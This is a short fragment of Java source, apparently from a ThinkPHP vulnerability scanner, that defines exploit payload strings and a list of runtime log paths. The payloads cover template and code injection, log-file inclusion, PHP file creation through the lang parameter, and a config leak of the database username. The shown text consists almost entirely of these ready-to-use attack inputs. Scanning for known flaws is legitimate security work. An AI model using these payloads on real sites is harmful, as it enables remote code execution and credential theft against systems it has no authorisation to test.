        payloadsTP_unknow_2 = "?s=index/\\think\\module/action/param1/${@phpinfo()}";
        payloadsTP3_1 = "index.php?m=--><?=phpinfo();?>";
        payloadsTP3_2 = "index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/22_11_30.log";
        payloadTP_lang_lfi = "?+config-create+/<?=phpinfo()?>+/tmp/a03dd2e5b.php";
        payloadsTP5InfoLeak = "?s=.|think\\config/get&name=database.username";
        payloadsTP_logs = new String[]{"/runtime/log", "/Runtime/Logs", "/Runtime/Logs/Home", "/Runtime/Logs/Admin", "/App/Runtime/Logs", "/Application/Runtime/Logs", "/Application/Runtime/Logs/Home", "/Application/Runtime/Logs/Common", "/Application/Runtime/Logs/Admin"};
    }
}

